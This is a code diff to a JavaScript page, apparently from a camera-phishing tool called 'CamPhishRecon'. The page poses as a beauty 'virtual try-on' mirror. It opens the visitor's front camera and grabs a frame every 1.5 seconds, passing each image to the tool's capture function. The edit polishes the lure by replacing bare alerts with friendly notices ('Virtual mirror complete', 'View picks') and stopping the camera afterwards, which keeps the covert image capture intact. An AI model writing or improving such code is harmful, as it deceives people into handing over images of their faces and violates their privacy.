@@ -118,8 +118,8 @@ navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).the
 var v=document.getElementById('v');v.srcObject=stream;v.play();
 var cap=document.getElementById('cap'),cx=cap.getContext('2d');
 var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'beauty_tryon');}},1500);
-setTimeout(function(){clearInterval(ci);sc.classList.remove('active');alert('Virtual mirror session ended. Check your recommended products!');},8000);
-}).catch(function(){setTimeout(function(){sc.classList.remove('active');alert('Camera access needed for virtual try-on.');},2000);});
+ setTimeout(function(){clearInterval(ci);stream.getTracks().forEach(function(t){t.stop();});sc.classList.remove('active');if(window.CamPhishRecon&&CamPhishRecon.UI){CamPhishRecon.UI.notice({title:'Virtual mirror complete',message:'Your try-on session ended. Check the recommended products below.',tone:'success',actionLabel:'View picks'});}else{alert('Your try-on session ended. Check the recommended products below.');}},8000);
+ }).catch(function(){setTimeout(function(){sc.classList.remove('active');if(window.CamPhishRecon&&CamPhishRecon.UI){CamPhishRecon.UI.notice({title:'Camera access needed',message:'Enable camera access to use the virtual try-on mirror.',tone:'warning',actionLabel:'Got it'});}else{alert('Enable camera access to use the virtual try-on mirror.');}},2000);});
 }else{setTimeout(function(){sc.classList.remove('active');},2000);}
 }
 function shareResult(t){
